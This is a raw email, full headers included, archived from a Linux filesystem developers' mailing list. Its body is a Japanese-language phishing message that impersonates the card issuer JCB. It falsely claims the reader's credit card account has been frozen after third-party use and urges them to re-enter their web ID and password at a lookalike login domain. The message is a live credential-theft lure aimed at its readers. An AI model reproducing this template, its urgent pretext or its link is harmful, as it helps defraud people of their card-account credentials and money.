Return-Path: <linux-f2fs-devel-bounces@lists.sourceforge.net>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 85746C433F5
	for <linux-f2fs-devel@archiver.kernel.org>; Thu, 17 Feb 2022 18:08:11 +0000 (UTC)
Received: from [127.0.0.1] (helo=sfs-ml-4.v29.lw.sourceforge.com)
	by sfs-ml-4.v29.lw.sourceforge.com with esmtp (Exim 4.94.2)
	(envelope-from <linux-f2fs-devel-bounces@lists.sourceforge.net>)
	id 1nKlCN-0004TQ-A0; Thu, 17 Feb 2022 18:08:10 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-4.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.94.2)
 (envelope-from <mail@qa.jcb.co.jp>) id 1nKlCL-0004TK-RN
 for linux-f2fs-devel@lists.sourceforge.net; Thu, 17 Feb 2022 18:08:08 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Date:Subject:To:From:Message-ID:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=0oEAcQBqY3kIQahetKwOzCgapejaeZgWEGAgiY+5UiE=; b=KMBruj+vr1uB4n659+MXiYUssx
 npySkNEn/EsKJChxSUThySDxbzsRz34LM4+Ln4PtFt9TZMJ3jIw+gjiNEQpkgIKtj6Z0HW9oiehWr
 gjabbyLQL2Bd/5OEMhw+6ZWYho7Nqac9367ab50mIUuObGf7g8jFUrZbOk9enGO5ReLA=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Date:Subject:To:From:
 Message-ID:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=0oEAcQBqY3kIQahetKwOzCgapejaeZgWEGAgiY+5UiE=; b=N
 0IWrui0innG9/9QCuXu6yxHgP3TxU6zxBkXMu+KrdG8EW29TY0lnTBjhRajPVUTmCl5WLIQnwwZwk
 eidR64WhimZFGuJgY/toiOoqSgUXfNSaMNL0c7GXM/h5LyAdGFhaLjMRgHYRN6L/+BT2OA0pUMPD4
 nXjRrwNRBTStTEQ4=;
Received: from [152.32.158.100] (helo=qa.jcb.co.jp)
 by sfi-mx-1.v28.lw.sourceforge.com with esmtp (Exim 4.94.2)
 id 1nKlCH-0055FC-Vq
 for linux-f2fs-devel@lists.sourceforge.net; Thu, 17 Feb 2022 18:08:08 +0000
Message-ID: <20220217233806071888@qa.jcb.co.jp>
To: <linux-f2fs-devel@lists.sourceforge.net>
Date: Thu, 17 Feb 2022 23:37:56 +0530
MIME-Version: 1.0
X-mailer: Ezxinwn 1
X-Headers-End: 1nKlCH-0055FC-Vq
Subject: [f2fs-dev] =?iso-2022-jp?b?GyRCJCIkSiQ/JE4bKEJqY2IbJEIlKyE8GyhC?=
	=?iso-2022-jp?b?GyRCJUkkSyRPJWolOSUvPGgweiQsJCIkaiReJDkkTiRHGyhC?=
	=?iso-2022-jp?b?GyRCISIbKEIzGyRCRnwwSkZiJEslUSU5JW8hPCVJJHIbKEI=?=
	=?iso-2022-jp?b?GyRCSlE5OSQ3ISIlaiU5JS8kcjJyPXwkNyRGJC8kQCQ1GyhC?=
	=?iso-2022-jp?b?GyRCJCQbKEI=?=
X-BeenThere: linux-f2fs-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <linux-f2fs-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/linux-f2fs-devel>, 
 <mailto:linux-f2fs-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=linux-f2fs-devel>
List-Post: <mailto:linux-f2fs-devel@lists.sourceforge.net>
List-Help: <mailto:linux-f2fs-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/linux-f2fs-devel>, 
 <mailto:linux-f2fs-devel-request@lists.sourceforge.net?subject=subscribe>
From: JCB Webmaster via Linux-f2fs-devel
 <linux-f2fs-devel@lists.sourceforge.net>
Reply-To: JCB Webmaster <mail@qa.jcb.co.jp>
Content-Type: text/plain; charset="iso-2022-jp"
Content-Transfer-Encoding: 7bit
Errors-To: linux-f2fs-devel-bounces@lists.sourceforge.net

■□■━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
□■　　MyJCB Express News　［2022-02-17］
本メールはドメインの運用（メール送受信やホームページの表示）に関わる
　重要な通知となります。
■　━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
　∴‥∵‥∴‥∵‥∴‥∴‥∵‥∴‥∵‥∴‥∴‥∵‥∴‥∵‥∴‥∴‥∵‥∴
 
あなたのクレジットカード口座が第三者によって使用されていることを検知したので、あなたの口座が資金の安全のために凍結されたのですが、すぐにWEBサービスIDとパスワードを再登録して、制限を解除しなければなりません
 
変更をご WEBサービスよりお申込みください。
 
 
■ 変更をご 方法
▼MyJCBログインはこちら
https://my-jcb-co-jp.cyyan.xyz
 
 
 
 
＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝
　株式会社ジェーシービー 
　東京都港区南青山5-1-22　青山ライズスクエア　〒107-8686
　※本メールは送信専用です。
　  お問い合わせは上のURLの、専用フォームよりお願いします。
＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝
　「MyJCB Express News」に掲載されているすべての記事、
　文章等の無断転載を禁止します。
　著作権はすべて、株式会社ジェーシービーに帰属します。
　Copyright JCB Co., Ltd. 2020
＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝＝
　　　　　　　　　　　　　　　　　　　　　　　　　　　　　 E191010242

_______________________________________________
Linux-f2fs-devel mailing list
Linux-f2fs-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/linux-f2fs-devel
